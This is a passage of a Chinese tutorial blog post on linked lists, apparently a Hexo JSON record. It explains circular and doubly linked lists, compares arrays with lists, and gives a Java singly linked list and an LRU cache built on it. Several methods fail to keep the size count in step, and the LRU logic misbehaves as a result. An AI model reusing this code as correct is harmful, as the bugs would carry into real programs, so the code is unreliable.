%}\n\n和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。\n\n#### 双线链表\n\n接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：**双向链表**。\n\n单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。\n\n{% asset_img 双向链表.jpg %}\n\n从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？\n\n从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。\n\n你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。\n\n我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：\n* 删除结点中“值等于某个给定值的”结点\n* 删除给定指针指向的结点\n\n对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。\n\n尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。\n\n对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p->next = q，说明p是q的前驱结点。\n\n但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！\n\n同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。\n\n除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。\n\n现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。\n\n实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。\n\n还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。\n\n所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？\n\n了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：**双向循环链表**。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？\n\n{% asset_img 双向循环链表.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 链表 VS 数组性能大比拼\n{% endnote %}\n</div>\n\n通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。\n\n|时间复杂度|数组|链表|\n|--------|----|----|\n|插入删除|O(n)|O(1)|\n|随机访问|O(1)|O(n)|\n\n不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。\n\n数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。\n\n数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。\n\n你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。\n\n我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。\n\n除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。\n\n所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？\n\n我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。\n\n1. 如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。\n\n2. 如果此数据没有缓存在链表中，又可以分为两种情况：\n  - 如果此时缓存未满，则将此结点直接插入到链表的头部；\n  - 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。\n\n这样我们就实现了一个LRU缓存，是不是很简单。\n\n现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。\n\n实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。\n\n基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。\n\n和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 课后思考\n{% endnote %}\n</div>\n\n如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<br>\n\n本章代码：[GitHub](https://github.com/AriesRen/algorithm)\n\n带头单链表代码：\n\n```java\nimport java.util.NoSuchElementException;\n\npublic class SinglyLinkedList<T>{\n    private Node<T> head;\n    private int size;\n\n    public SinglyLinkedList(){\n        this.head = new Node<>(null);\n    }\n\n    // 链表头部插入值\n    private void linkFirst(Node<T> newNode){\n        newNode.next = head.next;\n        head.next = newNode;\n        size++;\n    }\n    // 链表尾部插入值\n    public void linkLast(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    private void linkLast(Node<T> newNode){\n        Node<T> p = head;\n        while (p.next!=null){\n            p=p.next;\n        }\n        p.next = newNode;\n        size++;\n    }\n    // 获取头部值\n    public T getFirst(){\n        if (head.next == null){\n            throw new NoSuchElementException();\n        }\n        return head.next.val;\n    }\n    // 获取尾部值\n    public T getLast(){\n        Node<T> p = head.next;\n        while (p.next!=null){\n            p = p.next;\n        }\n        return p.val;\n    }\n    // 添加\n    public void add(T val){\n        Node<T> newNode = new Node<>(val);\n        linkLast(newNode);\n    }\n    // 在某处索引插入\n    public void add(int index, T val){\n        Node<T> newNode = new Node<>(val);\n        Node<T> p = node(index);\n        insert(p, newNode);\n    }\n    private void insert(Node<T> p, Node<T> newNode){\n        Node<T> q = head;\n        while (q!=null && q.next!=p){\n            q = q.next;\n        }\n        if (q == null){\n            return;\n        }\n        newNode.next = p;\n        q.next = newNode;\n    }\n\n    // 根据值删除某个节点\n    public boolean delete(T val){\n        Node<T> p = head;\n        while (p.next !=null && !p.next.val.equals(val)){\n            p = p.next;\n        }\n        if (p.next== null){\n            return false;\n        }\n        p.next = p.next.next;\n        return true;\n    }\n    // 根据索引删除某结点\n    public T delete(int index){\n        Node<T> deleteNode = node(index);\n        return deleteNode(deleteNode);\n    }\n    private T deleteNode(Node<T> deleteNode){\n        final T element = deleteNode.val;\n        Node<T> p = head;\n        while (p.next!= null && p.next != deleteNode){\n            p = p.next;\n        }\n        if (p.next == null){\n            return null;\n        }\n        p.next = deleteNode.next;\n        return element;\n    }\n\n    // 根据索引获取值\n    public T get(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        return node(index).val;\n    }\n\n    // 通过value 查找对应的索引\n    public int indexOf(T val){\n        int index = 0;\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n            index ++;\n        }\n        if (p.next == null){\n            index = -1;\n        }\n        return index;\n    }\n    public boolean contains(T val){\n        Node<T> p = head;\n        while (p.next !=null && p.next.val!=val){\n            p = p.next;\n        }\n        return p.next != null;\n    }\n\n    private Node<T> node(int index){\n        if (index >= size || index < 0){\n            throw new IndexOutOfBoundsException(\"Index: \"+index + \", Size: \"+size);\n        }\n        Node<T> p = head.next;\n        int i=0;\n        while (i<size){\n            if (i == index){ break; }\n            p = p.next;\n            ++i;\n        }\n        return p;\n    }\n    public void push(T val){\n        Node<T> newNode = new Node<>(val);\n        linkFirst(newNode);\n    }\n    public T pop(){\n        return unlinkedFirst();\n    }\n\n    private T unlinkedFirst(){\n        Node<T> first = head.next;\n        if (first == null){\n            throw new RuntimeException(\"没有元素\");\n        }\n        return unlinkedFirst(first);\n    }\n    private T unlinkedFirst(Node<T> node){\n        final T element = node.val;\n        head.next = head.next.next;\n        node.next = null;\n        node.val = null;\n        size--;\n        return element;\n    }\n\n    // 单链表反转\n    public void reverse(){\n        // 链表为空或者链表只有一个元素时\n        if (head.next == null || size <=1 ){\n            return;\n        }\n        Node<T> p = head.next;\n        Node<T> q = p.next;\n        Node<T> r;\n        p.next = null;\n        while (q !=null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        head.next = p;\n    }\n\n    public int size(){\n        return size;\n    }\n\n    // 打印链表 example: [1, 2, 3]\n    @Override\n    public String toString() {\n        if (head.next == null){\n            return \"[]\";\n        }\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        Node<T> p = head.next;\n        while (p.next!=null){\n            sb.append(p.val).append(\", \");\n            p = p.next;\n        }\n        sb.append(p.val).append(\"]\");\n        return sb.toString();\n    }\n\n    public static class Node<T>{\n        private T val;\n        private Node<T> next;\n        Node(T val){\n            this.val = val;\n        }\n    }\n}\n```\n\n基于链表的LRU缓存代码：\n```java\npublic interface LRUCache<T> {\n    void put(T val);\n\n    T get(T val);\n\n    int Size();\n}\n\nclass ListLRUCache<T> implements LRUCache<T> {\n    private SinglyLinkedList<T> lruList;\n    private static final int DEFAULT_CAP=10;\n\n    // 缓存容量\n    private int cap;\n    // 缓存使用大小\n    private int size;\n\n    public ListLRUCache(){\n        this(DEFAULT_CAP);\n    }\n    public ListLRUCache(int cap){\n        this.cap = cap;\n        this.lruList = new SinglyLinkedList<>();\n    }\n\n    @Override\n    public void put(T value) {\n        // 1、缓存满了\n        // 如果该列表中没有该数据\n        if (size == cap){\n            // 1、缓存满了\n            // 删除最后一个节点\n            lruList.delete(size-1);\n            // 将该数据插入到链表头部\n            lruList.push(value);\n        }else {\n            // 2、缓存未满\n            // 直接在列表头部插入该数据\n            lruList.push(value);\n            size++;\n        }\n    }\n\n    @Override\n    public T get(T val) {\n        T result = null;\n        if (lruList.contains(val)){\n            // 在list中,从list中获取该数据\n            int index = lruList.indexOf(val);\n            result = lruList.get(index);\n            System.out.println(\"从缓存中获取\");\n            // 将该节点插入到链表头部\n            lruList.delete(index);\n            lruList.push(val);\n        }else{\n            // 如果该列表中没有该数据\n            System.out.println(\"缓存中没有该数据！\");\n            if (size == cap){\n                // 1、缓存满了\n                // 删除最后一个节点\n                lruList.delete(size-1);\n                // 将该数据插入到链表头部\n                lruList.push(val);\n                System.out.println(\"缓存已满！将该数据插入到缓存\");\n            }else {\n                // 2、缓存未满\n                // 直接在列表头部插入该数据\n                lruList.push(val);\n                size++;\n                System.out.println(\"将该数据直接插入到缓存\");\n            }\n            // 如果有数据库，该数据从数据库中获取\n            result = val;\n        }\n\n        return result;\n    }\n\n    public int Size(){\n        return size;\n    }\n}\n```\n\n字符串是否是回文字符串：\n```java\n\n```\n\n<br>","slug":"算法-链表","published":1,"updated":"2018-11-29T09:59:50.807Z","_id":"cjpdmv0fr003t4cv06qribd8b","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>今天我们来聊聊“链表 LinkedList”这个数据结构，学习链表有什么用呢，我们先来讨论一个经典的链表使用场景，那就是LRU缓存淘汰算法。</p>\n<p>缓存是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的CPU缓存、数据库缓存、浏览器缓存等等。</p>\n<p>缓存的大小有限，当缓存被占满时，那些数据应该被清理出去，那些数据应该被保留？这就需要缓存淘汰策略来决定。常见的策略有这么三种：先进先出策略FIFO(First In First Out)、最少使用策略LFU(Least Frequently Used)、最近最少使用策略LRU(Least Recently Used)。</p>\n<p>今天我们的问题是，怎样用链表来实现一个LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表及其结构\"><a href=\"#链表及其结构\" class=\"headerlink\" title=\"链表及其结构\"></a>链表及其结构</h3></div><br></div>\n\n<p>相比数组，链表是一种稍微复杂一点的数据结构，掌握起来也要比数组要困难一些。数组和链表是两个非常基础、非常常用的数据结构。所以要掌握甚至精通，同时理解其思想。</p>\n<p>我们先从<strong>底层存储结构</strong>来看一下二者的区别：</p>\n<p>为了直观的对比，我画了一张图，从图中可以看到，<strong>数组需要一块连续的内存空间来存储</strong>，对内存的要求比较高，如果我们申请一个100MB大小的内存空间，当内存中没有连续的、足够大的内存空间时，即便剩余的总空间大于100MB，仍然会申请失败。</p>\n<p>而链表恰恰相反，它并不需要一块连续的内存空间，他<strong>通过“指针”将一组零散的内存块连接起来</strong>使用，所以申请一块大小是100MB的链表，根本不会有问题。</p>\n<img src=\"/posts/2018-09-12-算法-链表/数组与链表结构对比.jpg\" title=\"数组与链表结构对比\">\n<p>链表的结构五花八门，今天我们着重介绍三种最常用的链表结构：单链表、双向链表、循环链表。</p>\n<h4 id=\"单链表\"><a href=\"#单链表\" class=\"headerlink\" title=\"单链表\"></a>单链表</h4><p>首先来看最简单、最常用的单链表。我们刚讲到，链表是用指针将一组零散的内存块串联在一起，其中，我们把内存块称为链表的“<strong>结点</strong>”。为了使所有的节点串联起来，每个链表的结点出了需要保存数据之外，还需要记录链上下一个结点的地址，如图所示，我们把这个记录下一个结点指针地址的指针叫做<strong>后继指针 next</strong>。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表.jpg\">\n<p>从上面单链表的结构图中，可以发现，单链表中有两个结点是比较特殊的，分别是第一个节点和最后一个结点，我们习惯性的把第一个结点称为<strong>头结点</strong>，最后一个节点称为<strong>尾结点</strong>。其中头结点用来记录链表的基地址，我们可以通过它遍历得到整个链表。而尾结点的特殊之处在于，指针不是指向下一个结点，二是指向了一个空地址null，表示这是链表的最后一个结点。</p>\n<p>与数组一样，链表也支持数据的插入、查找、删除操作。我们知道在进行数组的插入、删除操作时，为了保持内存的连续性，需要做大量的数据搬移操作，所以时间复杂度是O(n)。而在链表中插入或者删除一个数据，我们并不需要保持内存的连续性而搬移结点，因为链表本身的存储空间就不是连续的。所以在链表中插入删除一个数据是非常快的。</p>\n<p>为了方便理解，我画了一张图，从图中我们可以看出，针对链表的插入和删除操作，我们只需要考虑相邻结点的指针改变，所以对应的时间复杂度为O(1)。</p>\n<img src=\"/posts/2018-09-12-算法-链表/单链表插入删除.jpg\">\n<p>但是有利就有弊，链表想要随机访问第K个元素就没有数组那么高效了。因为链表中的数据并非是连续存储的，所以无法像数组那样，根据首地址和下标，通过寻址公式就可以直接计算出对应的内存地址，而是需要一个一个结点依次遍历，直到找到对应的结点。</p>\n<p>你可以把链表想象成一个队伍，每个人都知道自己前面的人是谁，所以当我们希望知道排在第K为的人是谁的时候，就需要从第一个人开始，一个一个往下数。所以链表随机访问的性能没有数组好，时间复杂度为O(n)。</p>\n<p>好了，单链表了解了，下面来看看另外两个复杂的链表：<strong>循环链表和双向链表</strong>。</p>\n<h4 id=\"循环链表\"><a href=\"#循环链表\" class=\"headerlink\" title=\"循环链表\"></a>循环链表</h4><p><strong>循环链表是一种特殊的单链表</strong>。实际上，循环链表也很简单，它和单链表唯一的区别就在尾结点。我们知道，单链表的尾结点是指向空地址，表示这是最后的节点了，而循环链表的尾结点的指针是指向链表的头结点。从下图中可以看出，循环链表想一个环一样首尾相连，所以叫循环链表。</p>\n<img src=\"/posts/2018-09-12-算法-链表/循环链表.jpg\">\n<p>和单链表相比，循环链表的优点是从链尾到链头比较方便。当要处理的数据具有环形结构特点时，就特别适合采用循环链表，比如著名的约瑟夫问题。尽管用单链表也可以实现，但是用循环链表的话，代码就会简洁很多。</p>\n<h4 id=\"双线链表\"><a href=\"#双线链表\" class=\"headerlink\" title=\"双线链表\"></a>双线链表</h4><p>接下来再看一个稍微复杂，在实际的软件开发中，也更加常见的链表结构：<strong>双向链表</strong>。</p>\n<p>单链表只有一个方向，节点只有一个后继指针，next指向后面的结点。而双向链表，顾名思义，它支持两个方向，每个结点不止有一个后继指针next指向后面的结点，还有一个前驱指针prev指向前面的结点。</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向链表.jpg\">\n<p>从上图可以看出，双向链表需要额外的两个空间来存储后继结点和前驱结点的地址。所以，如果存储同样多的数据，双向链表要比单向链表占用更多的内存空间。虽然两个指针比较浪费存储空间，但可以支持双向遍历，这样也带来了双向链表的操作灵活性。那相比单向链表，双向链表适合解决哪种问题呢？</p>\n<p>从结构上来看，双向链表可以支持O(1)时间复杂度的情况下找到前驱结点，正是这样的特点，也使双向链表在某些情况下的删除、插入操作比单链表要简单、高效。</p>\n<p>你可能会说，单链表的插入、删除操作的时间复杂度都已经是O(1)了，双向链表还能怎么高效呢？别着急，刚刚的分析比较偏理论，很多数据结构和算法的书籍也是这么说得，但是这种说法实际上是不准确的，或者说是有先觉条件的。</p>\n<p>我们再来分析一下链表的两个操作，先来看删除操作。在实际的软件开发中，从链表中删除一个数据无外乎这两种情况：</p>\n<ul>\n<li>删除结点中“值等于某个给定值的”结点</li>\n<li>删除给定指针指向的结点</li>\n</ul>\n<p>对于第一种情况，不管是单链表还是双向链表，为了查找到值等于某个给定值的结点，都需要从头开始一个一个依次遍历对比，知道找到值等于给定值的结点，再通过前面讲的指针操作将其删除。</p>\n<p>尽管单纯的删除操作时间复杂度都是O(1)，但是遍历查找的时间是主要的耗时点，对应的时间复杂度为O(n)，根据时间复杂度分析中的加法法则，删除值等于给定值的结点对应的链表操作的总时间复杂度为O(n)。</p>\n<p>对于第二种情况，我们已经找到了要删除的结点，但是删除某个结点q需要知道前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是要从头结点开始遍历链表，知道p-&gt;next = q，说明p是q的前驱结点。</p>\n<p>但是对于双向链表来说，这种情况就比较有优势了。因为双向链表中的结点已经保存了前驱结点的指针，不需要像单链表那样遍历。所以针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就搞定了！</p>\n<p>同理，如果我们希望在链表的某个指定结点前面插入一个结点，双向链表比单链表有很大优势，双向链表可以在O(1)时间复杂度搞定，而单向链表需要O(n)的时间复杂度。</p>\n<p>除了插入、删除操作有优势之外，对于一个有序链表，双向链表的按值查找的效率也要比单向链表高一些。因为我们可以记录上次查找的位置p，每次查询时，根据要查找的值与p的大小关系，决定是向前查找还是往后查找，所以平均只需要查找一半的数据。</p>\n<p>现在，有没有觉得双向链表比单向链表更加高效呢？这就是问什么在实际的软件开发中，双向链表尽管比较费内存，但还是比单链表的应用更加广泛的原因。如果你熟悉Java语言，你肯定用过LinkedHashMap这个容器，如果你深入研究LinkedHashMap的实现原理，就会发现其中就用到了双向链表这种数据结构。</p>\n<p>实际上，这里有一个更重要的知识点需要你掌握，那就是用空间换时间的设计思想。当内存空间充足时，如果我们更追求代码的执行速度，我们就可以选择空间复杂度相对较高，但时间复杂度相对较低的算法和数据结构。相反，如果内存比较紧缺，比如代码跑在手机或者单机片中，这个时候，就要反过来用时间换空间的涉及思路。</p>\n<p>还是开篇缓存的例子，缓存实际上就是利用了空间换时间的例子。虽然我们将数据存放在磁盘上，会比较节省内存，但是每次查询数据都要查询一遍磁盘，会比较慢。但是我们通过缓存技术，事先将数据加载在内存中，虽然会比较耗费内存空间，但是每次查询数据的速度就大大提高了。</p>\n<p>所以对于执行较慢的程序，可以通过消耗更多的内存(空间换时间)进行优化；而消耗过多内存的程序，可以通过消耗更多的时间(时间换空间)来降低内存的消耗。你还能想到其他时间换空间或者空间换时间的例子吗？</p>\n<p>了解了循环链表和双向链表，如果把这两种链表整合在一起就是一个新的版本：<strong>双向循环链表</strong>。我想不需要我多讲，你应该知道双向循环链表长什么样子了吧？</p>\n<img src=\"/posts/2018-09-12-算法-链表/双向循环链表.jpg\">\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"链表-VS-数组性能大比拼\"><a href=\"#链表-VS-数组性能大比拼\" class=\"headerlink\" title=\"链表 VS 数组性能大比拼\"></a>链表 VS 数组性能大比拼</h3></div><br></div>\n\n<p>通过前面的学习，你应该知道，数组和链表是两种截然不同的内存组织方式，正是因为内存存储的区别，他们插入、删除、随机访问的时间复杂度正好相反。</p>\n<table>\n<thead>\n<tr>\n<th>时间复杂度</th>\n<th>数组</th>\n<th>链表</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>插入删除</td>\n<td>O(n)</td>\n<td>O(1)</td>\n</tr>\n<tr>\n<td>随机访问</td>\n<td>O(1)</td>\n<td>O(n)</td>\n</tr>\n</tbody>\n</table>\n<p>不过，数组和链表的对比，并不能局限于时间复杂度。而且，在实际的软件开发中，不能仅仅利用复杂度分析就能决定使用那哪个数据结构来存储数据。</p>\n<p>数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存并不好，没办法有效预读。</p>\n<p>数组的缺点是大小固定，一经声明就要占用整块连续内存空间。如果声明的数组过大，可能没有足够的连续内存空间分配给它，导致“内存不足”。如果声明的数组过小，则可能出现不够用的情况，这时只能再申请一个更大的内存空间，把原数组拷贝进去，非常费时。链表本身没有大小的限制，天然的支持动态扩容，我觉得这也是它与数组最大的区别。</p>\n<p>你可能会说，Java中也有ArrayList容器，也可以支持动态扩容啊？我们上一节已经讲过，当我们往支持动态扩容的数组中插入一个数据时，如果数组中没有空闲空间了，就会申请一个更大的空间，将原数组拷贝过去，而数据拷贝的操作是非常耗时的。</p>\n<p>我举一个稍微极端的例子。如果我们用ArrayList存储了1GB大小的数据，这个时候已经没有空闲空间了，当我们再插入数据的时候，ArrayList会申请一个1.5GB的存储空间，并且把原来那1GB的数据拷贝到新申请的空间上，听起来是不是就很耗时。</p>\n<p>除此之外，如果你的代码对内存的使用非常苛刻，那数组就更适合你。因为链表中的每个结点都需要消耗额外的内存空间去存储一份指向下一个结点的指针，所以内存消耗会翻倍。而且，对链表进行频繁的插入、删除操作，还会导致频繁的内存申请和释放，容易造成内存碎片，如果是java语言，就有可能会导致频繁的GC(Garbage Collection 垃圾回收)。</p>\n<p>所以在实际的开发项目中，要根据不同的项目情况，权衡究竟是选择数组还是链表。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>好了，我们现在回过头来看，如何基于链表实现LRU缓存淘汰算法？</p>\n<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新数据被访问时，我们从链表头部开始顺序遍历链表。</p>\n<ol>\n<li><p>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，再插入到链表的头部。</p>\n</li>\n<li><p>如果此数据没有缓存在链表中，又可以分为两种情况：</p>\n<ul>\n<li>如果此时缓存未满，则将此结点直接插入到链表的头部；</li>\n<li>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</li>\n</ul>\n</li>\n</ol>\n<p>这样我们就实现了一个LRU缓存，是不是很简单。</p>\n<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为O(n)。</p>\n<p>实际上，我们可以继续优化这个实现思路，比如引入哈希表(hash table)来记录每个数据的位置，将缓存访问的时间复杂度降到O(1)。这个优化方案，等讲到哈希表的时候再讲。</p>\n<p>基于链表的实现思路，实际上还可以用数组来实现LRU缓存淘汰策略。如何利用数组实现LRU缓存淘汰策略？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天我们讲了一种跟数组“相反”的数据结构，链表。他跟数组一样，也是非常基础、非常常用的数据结构。不过链表要比数组稍微复杂，从普通链表衍生出来好几种链表结构，比如双向链表、循环链表、双向循环链表。</p>\n<p>和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过在具体的软件开发中，要对数组和链表的各种性能进行对比，综合来使用两者中的一个。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3></div><br></div>\n\n<p>如何判断一个字符串是否是回文字符串呢？今天的思考题就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那如何来判断是一个回文串呢？相应的时间空间复杂度是多少。</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<p><br></p>\n<p>本章代码：<a href=\"https://github.com/AriesRen/algorithm\" target=\"_blank\" rel=\"noopener\">GitHub</a></p>\n<p>带头单链表代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span 